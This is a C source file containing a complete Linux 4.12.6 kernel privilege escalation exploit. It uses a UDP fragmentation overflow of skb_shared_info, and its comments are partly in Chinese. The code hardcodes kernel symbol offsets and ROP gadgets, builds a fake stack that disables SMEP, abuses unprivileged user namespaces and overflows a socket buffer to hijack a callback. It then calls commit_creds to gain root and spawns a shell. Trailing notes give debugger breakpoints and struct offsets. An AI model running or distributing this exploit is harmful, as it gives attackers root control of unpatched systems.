// $ gcc -static -masm=intel ./exp.c -o ./exp  
// version: Linux-4.12.6
#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/socket.h>
#include <netinet/ip.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/utsname.h>

// Will be overwritten if ENABLE_KASLR_BYPASS is enabled.
unsigned long KERNEL_BASE =		0xffffffff81000000ul;
// Used to get root privileges.
#define COMMIT_CREDS			(KERNEL_BASE + 0xa49e0)				// ffffffff810a49e0 T commit_creds
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + 0xa4db0)				// ffffffff810a4db0 T prepare_kernel_cred

#define XCHG_EAX_ESP_RET		(KERNEL_BASE + 0x4AD63)				// 0xffffffff8100009c: xchg eax, esp; ret; 				.text:FFFFFFFF8104AD63		setz    r11b 
#define POP_RDI_RET			(KERNEL_BASE + 0x23c9bd)				// 0xffffffff8123c9bd: pop rdi; ret; 
#define MOV_CR4_RDI_RET			(KERNEL_BASE + 0x20280)				// 0xffffffff81020280: mov cr4, rdi; pop rbp; ret; 

#define swapgs_addr (KERNEL_BASE + 0x63534) // 0xffffffff81063534: swapgs; pop rbp; ret; 
#define iret_addr (KERNEL_BASE + 0x454e44) // 0xffffffff81454e44: iretq; ret 0xfff; 

void get_root(){
    char* (*pkc)(int)=PREPARE_KERNEL_CRED;
    void (*cc)(char*)=COMMIT_CREDS;
    (*cc)((*pkc)(0));
    return;
}

void getshell(){
    system("/bin/sh");
    return;
}

size_t user_cs,user_ss,user_rsp,user_flag;
void save_state()
{
    __asm__(
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_rsp,rsp;"
            "pushf;"
            "pop user_flag;"
            );
    puts("[*] save the state success!");
}

void construct_rop(uint64_t* stack)
{
	*stack++ = POP_RDI_RET;
	*stack++ = 0x6f0;
	*stack++ = MOV_CR4_RDI_RET;
	*stack++ = 0;
	*stack++ = get_root;
	*stack++ = swapgs_addr;
	*stack++ = 0;
	*stack++ = iret_addr;
	*stack++ = getshell;		// getshell  check_root
	*stack++ = user_cs;
	*stack++ = user_flag;
	*stack++ = user_rsp;
	*stack++ = user_ss;
}

// mmap_stack() —— 在用户空间 eax 处布置好 rop
void mmap_stack() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = XCHG_EAX_ESP_RET % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}

	stack = (uint64_t*)((char*)stack_aligned + stack_offset);

	construct_rop(stack);
	/*CHAIN_SAVE_ESP;
	CHAIN_DISABLE_SMEP;
	CHAIN_JMP_PAYLOAD;*/
}

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

struct ubuf_info {
	uint64_t callback;	// void (*callback)(struct ubuf_info *, bool)
	uint64_t ctx;		// void *
	uint64_t desc;		// unsigned long
};
// v4.12.6 和 v4.8 不同: 成员的顺序不同，且 gso_type 长度不同
struct skb_shared_info {
	unsigned short	_unused;
	uint8_t nr_frags;	// unsigned char
	uint8_t tx_flags;	// __u8
	uint16_t gso_size;	// unsigned short
	uint16_t gso_segs;	// unsigned short
	uint64_t frag_list;	// struct sk_buff *
	uint64_t hwtstamps;	// struct skb_shared_hwtstamps
	unsigned int gso_type;	// unsigned short  !!!
	uint32_t tskey;		// u32
	uint32_t ip6_frag_id;	// __be32
	uint32_t dataref;	// atomic_t
	uint64_t destructor_arg; // void *
	uint8_t frags[16][17];	// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui; // (uint64_t)&ui  0x6666666666666666
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func; 	// func
}

#define SHINFO_OFFSET 3164				// change!!!!!   3164  3712

void oob_execute(unsigned long payload) {
	char buffer[4096];
	memset(&buffer[0], 0x42, 4096);
// 布置数据
	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);

	int s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("[-] socket()");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (connect(s, (void*)&addr, sizeof(addr))) {
		perror("[-] connect()");
		exit(EXIT_FAILURE);
	}
// 第1次send
	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
	int rv = send(s, buffer, size, MSG_MORE);
	if (rv != size) {
		perror("[-] send()");
		exit(EXIT_FAILURE);
	}
// 修改 SO_NO_CHECK
	int val = 1;
	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));		// change SO_NO_CHECK
	if (rv != 0) {
		perror("[-] setsockopt(SO_NO_CHECK)");
		exit(EXIT_FAILURE);
	}
// 第2次send
	send(s, buffer, 1, 0);

	close(s);
}

#define CHUNK_SIZE 1024
static bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		printf("[!] unprivileged user namespaces are not available\n");
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo mtu 1500") != 0) {
		perror("[-] system(/sbin/ifconfig lo mtu 1500)");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

int main(int argc, char** argv) {
	printf("[.] starting\n");
	save_state();
	printf("[.] setting up namespace sandbox\n");
	setup_sandbox();
	printf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	printf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);
// Step 1: construct ROP chain
	unsigned long payload = (unsigned long)&get_root;
	printf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
// Step 2: trigger the vulnerability
	printf("[.] executing payload %lx\n", payload);
	oob_execute(payload);

	return 0;
}
/*
(1) 回调函数处				uarg->callback(uarg, true);
$ b net/core/skbuff.c:604
往前找	skb_release_all()
$ b net/core/skbuff.c:667

(2) 溢出点
调用skb_copy_and_csum_bits()
$ b net/ipv4/ip_output.c:1074

(3) 释放函数 skb_release_data()
目的: 查看 skb_shared_info 在 sk_buff 中的偏移位置
$ b net/core/skbuff.c:584		// struct skb_shared_info *shinfo = skb_shinfo(skb);

$ p/x &(*(struct sk_buff *)0)->cloned
pwndbg> p/x &(*(struct sk_buff *)0)->cloned
$2 = 0x8e
pwndbg> p/x &(*(struct sk_buff *)0)->nohdr
$1 = 0x8e
pwndbg> p/x &(*(struct skb_shared_info *)0)->dataref
$3 = 0x24

pwndbg> p/x &(*(struct skb_shared_info *)0)->frags
$4 = 0x30
pwndbg> p/x &(*(struct skb_shared_info *)0)->destructor_arg
$5 = 0x28
pwndbg> p/x &(*(struct skb_shared_info *)0)->frag_list
$6 = 0x8
pwndbg> p/x &(*(struct skb_shared_info *)0)->tx_flags
0x3

pwndbg> p/x &(*(struct ubuf_info *)0)->callback
ubuf_info


此时 r13 就是 skb_shared_info 的起始地址，这样就能查看skb_shared_info在buffer中的偏移是否正确
$ b *0xffffffff817b0bcc      // 0xffffffff817b0bcc <skb_release_data+28>:	add    r13,QWORD PTR [rdi+0xd0]
结果是正确的

(4) xchg eax, esp 这个gadget的地址太低无法用，改用以下地址
.text:FFFFFFFF8104AD63		setz    r11b

(5) cr4的值，可能不可用
RDI  0xffeff910    本文采用的ROP计算过于复杂，其实选取0x6f0即可。

(6) 保存用户态寄存器，跳出前恢复寄存器
*/